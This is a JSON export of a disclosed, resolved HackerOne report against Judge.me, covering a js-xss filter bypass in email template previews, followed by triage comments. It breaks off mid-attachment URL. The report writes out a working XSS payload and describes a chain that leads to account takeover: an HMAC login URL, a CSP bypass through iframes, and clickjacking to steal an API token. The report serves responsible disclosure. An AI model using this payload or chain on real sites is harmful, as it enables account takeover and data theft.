@@ -1,0 +1,864 @@
+{
+  "id": 1404804,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDA0ODA0",
+  "url": "https://hackerone.com/reports/1404804",
+  "title": "Email templates XSS by filterXSS bypass",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-11-19T01:19:30.225Z",
+  "submitted_at": "2021-11-19T01:19:30.319Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "caue",
+    "url": "/caue",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9p2kas9r0xrwhvs4tacmp324q5b1/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50842,
+    "url": "https://hackerone.com/judgeme",
+    "handle": "judgeme",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/g9q03amoi8tu4efai3eu2n8z2i3y/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/g9q03amoi8tu4efai3eu2n8z2i3y/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Judge.me ",
+      "twitter_handle": "",
+      "website": "https://judge.me",
+      "about": "Judge.me powers the product reviews for e-commerce stores. Our apps help you collect and display reviews on Shopify, WooCommerce and BigCommerce."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-05-25T07:45:26.623Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-12-23T05:35:55.778Z",
+  "team_member_agreed_on_going_public_at": "2022-05-25T07:45:26.451Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n`js-xss` is used to prevent XSS on email templates previews but the custom `onIgnoreTag` function can be used to bypass this filter. This leads to a Self-XSS scenario that can be used to achieve Account Takeover in 1-click.\n\n```js\nonIgnoreTag: function (e, t) {\n   return \"!--[if\" === e || \"![endif]--\" === e || \"<!-->\" === t ? t : void 0; \n},\n```\n\n## XSS\n\nThe way how `js-xss` parse tags starting with `<![` differ from how browser parse it, so it's possible to abuse this in this way:\n```html\n<![endif]-- onerror=\"<![endif]-->\" onload=\"<img src=1 onerror='alert(1)' />\">\n```\nSending this as the HTML email template will trigger an XSS when the email is previewed. Since email templates are private and only the owner of the template can preview it, this can be considered a Self-XSS. But there is a way to do another user preview it, leading to an account takeover in 1-click.\nWe can use HMAC authentication feature to force another user login in our account and preview the malicious email:\n```\nhttps://www.judge.me/shop/emails/2243518/edit?no_iframe=1&shop_domain=wordpress.caueo.me&platform=woocommerce&hmac=████\n```\nThis URL authenticates as admin on `wordpress.caueo.me` domain, where the malicious email will be. The HMAC hash is created on this way (taken from wordpress plugin):\n```php\n$hmac       = hash_hmac( 'sha256', \"no_iframe=1&platform=woocommerce&shop_domain={$domain}\", $token, false );\n```\n\nHaving this XSS with the victim logged in my account is possible to leak HTML content of a page that was loaded with victim's account cookie:\n\n1. Load an iframe with the victim's page (HTML content to leak) - Authenticated as victim\n2. Load another iframe with the XSS (Use HMAC authentication) - Authenticated as me\n3. We can use the XSS to read `parent.frames[0]` HTML content since it is same-origin\n\n## CSP bypass\nAt a first sight we can't load an iframe to victim's page, since it has a CSP that whitelists iframe origins:\n```\nframe-ancestors https://wordpress.caueo.me http://wordpress.caueo.me wordpress.caueo.me https://woocommerce-adapter.judge.me/ *.judge.me\n```\nTo bypass it we can use the XSS to load the iframes, but we need to do it on another subdomain, because to trigger this XSS is needed to login in my account and then it would not be possible to load the victim's page authenticated as victim's account later. So we trigger the XSS on `www.judge.me` subdomain.\n\n## Limitation to 0-click account takeover\nAt this point it is already **possible to read HTML content of almost any page authenticated as victim**. To achieve account takeover we only need to get the private API token from victim because it is used as the key of HMAC authentication.\nThe problem is that the endpoint that retrieves the API private token checks if the `Referer` header starts with `https://judge.me/settings`, so is not possible to load this endpoint in an iframe.\n\n## Clickjacking\nWe can load an iframe to `https://judge.me/settings` where has a button that retrieves the API token from the endpoint successfully. So it is possible to perform a clickjacking to that button, and if the victim clicks on it, we can get the API private token. \n\n## PoC\nI made a PoC on how is possible to perform this account takeover with user interaction and leak some stuffs without user interaction.\n[PoC](https://www.judge.me/shop/emails/2243518/edit?no_iframe=1&shop_domain=wordpress.caueo.me&platform=woocommerce&hmac=█████████)\n\nIn this PoC I leaked FreshChat token without clickjacking, so we can impersonate another user in support chat without needing a user click.\n\n## Impact\n\nShop account takeover (user interaction)\nImpersonation on support chat\nPrivate content leak",
+  "bounty_amount": "1250.0",
+  "formatted_bounty": "$1,250",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 47,
+  "voters": [
+    "8910jq",
+    "n1m0",
+    "tolga",
+    "xploiterr",
+    "iismailu",
+    "caioluders",
+    "vibonacci",
+    "zy9ard3",
+    "dnelsaka",
+    "sudi",
+    "and 37 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 57459,
+    "asset_type": "URL",
+    "asset_identifier": "judge.me",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 14383096,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @caue,\n﻿\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n﻿\nHave a great day! \n﻿\nKind regards,\n@offs1de",
+      "automated_response": false,
+      "created_at": "2021-11-20T14:00:19.909Z",
+      "updated_at": "2021-11-20T14:00:19.909Z",
+      "actor": {
+        "username": "h1_analyst_aegon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_aegon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/7lepmx2spp4rl6mwg4s5ijmsy87v/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14393526,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @caue,\n\nThanks for your report. I see recent browsers don't allow performing exploitation as the embedded page performs an action that trigs internal security mechanisms and disallows the target page from being framed/opened:\n\n{F1521827}\n\nAlso, it's not fully clear what the injection point/field is. Can you please clarify where the payload is injected?\n\nBest,\n@lugtag",
+      "automated_response": false,
+      "created_at": "2021-11-22T08:13:44.608Z",
+      "updated_at": "2021-11-22T08:13:44.608Z",
+      "actor": {
+        "username": "h1_analyst_jake",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_jake",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gKtXsNkprE7ekgjBwpwWpTzX/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1521827,
+          "filename": "Screenshot_2021-11-22_at_09.11.43.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0hi4s8bi8z3pel7q14tfs237dhu8?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-11-22_at_09.11.43.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-11-22_at_09.11.43.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1997827224898892ec661d07ce00b7d97049be5dc25377992f5a67c0f3029142"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14400000,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi! Sorry for not being that clear. To inject the XSS payload you have to go on email templates edit and insert the filterXSS bypass as HTML.\n{F1522211}\n\nAbout the browser security measures, I used the latest version of chrome and firefox for my tests, so it should work. Make sure you are logged in https://judge.me/ as a shop owner and then click on my PoC.\n\nAll the best",
+      "automated_response": false,
+      "created_at": "2021-11-22T14:19:05.677Z",
+      "updated_at": "2021-11-22T14:19:05.677Z",
+      "actor": {
+        "username": "caue",
+        "cleared": false,
+        "verified": false,
+        "url": "/caue",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9p2kas9r0xrwhvs4tacmp324q5b1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1522211,
+          "filename": "injection.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nrqhgs4fm650w1kxpmju431sm1r6?response-content-disposition=attachment%3B%20filename%3D%22injection.png%22%3B%20filename%2A%3DUTF-8%27%27injection.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=814aef903a9bc34694a1650c2d058e9f906928c036b5b2d817077fdec1d73a32"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14402307,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @caue,\n\nWe are still having trouble reproducing this from our side.\n\nDespite the attacking scenario you are trying to explain, we need a clear step-by-step demonstrate where an attacker should login, where to inject the payload and how to execute it. A PoC video would be much great to help us reproduce this report.\n\nBest,\n@offs1de  ",
+      "automated_response": false,
+      "created_at": "2021-11-22T17:00:13.346Z",
+      "updated_at": "2021-11-22T17:00:13.346Z",
+      "actor": {
+        "username": "h1_analyst_aegon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_aegon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/7lepmx2spp4rl6mwg4s5ijmsy87v/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14404998,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "I just realized that you can't edit email templates if you are logging in with a Shopify domain (you need a plan upgrade). I installed the JudgeMe wordpress extension and I use this to login.\n{F1522516}\n\nI also just realized that is needed to use burp save the template with XSS payload :)",
+      "automated_response": false,
+      "created_at": "2021-11-22T18:31:01.635Z",
+      "updated_at": "2021-11-22T18:31:01.635Z",
+      "actor": {
+        "username": "caue",
+        "cleared": false,
+        "verified": false,
+        "url": "/caue",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9p2kas9r0xrwhvs4tacmp324q5b1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1522516,
+          "filename": "2021-11-22_15-20-19.mp4",
+          "type": "video/mp4",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7u9caxrsl2bccla8ldq2nkzfbpq4?response-content-disposition=attachment%3B%20filename%3D%222021-11-22_15-20-19.mp4%22%3B%20filename%2A%3DUTF-8%27%272021-11-22_15-20-19.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ad6f07d10cee5e9bde1009161cce6934ab80e715a7529245aff02d1424569f78"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14416005,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @caue,\n\nI will discuss this with the internal team and get back to you once I have additional information to share. Thanks for your patience.",
+      "automated_response": false,
+      "created_at": "2021-11-23T14:54:34.564Z",
+      "updated_at": "2021-11-23T14:54:34.564Z",
+      "actor": {
+        "username": "h1_analyst_aegon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_aegon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/7lepmx2spp4rl6mwg4s5ijmsy87v/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14463119,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "`Privileges Required` is High because the attacker has to be the same-level admin user as the victim. ",
+      "automated_response": false,
+      "created_at": "2021-11-29T05:54:22.478Z",
+      "updated_at": "2021-11-29T05:54:22.478Z",
+      "additional_data": {
+        "old_severity": "High (8.8)",
+        "new_severity": "Medium (4.8)",
+        "old_severity_id": 1307524,
+        "new_severity_id": 1315605
+      },
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14463128,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @caue ,\n\nThanks a lot of the report! We are able to reproduce it. As you mention, we indeed use [js-xss library](https://github.com/leizongmin/js-xss), and customize `onIgnoreTag` to support IE comments. And the customization `onIgnoreTag` enables this vulnerability. \n\nAbout the clickjacking to get API private token on `/settings` page, we still don't get how it can be done. Because even if `/settings` page is loaded in an iframe with clickjacking, the AJAX request to fetch the private token is within that iframe only, so the attacker still cannot access to that AJAX request, right?",
+      "automated_response": false,
+      "created_at": "2021-11-29T05:57:55.011Z",
+      "updated_at": "2021-11-29T05:57:55.011Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85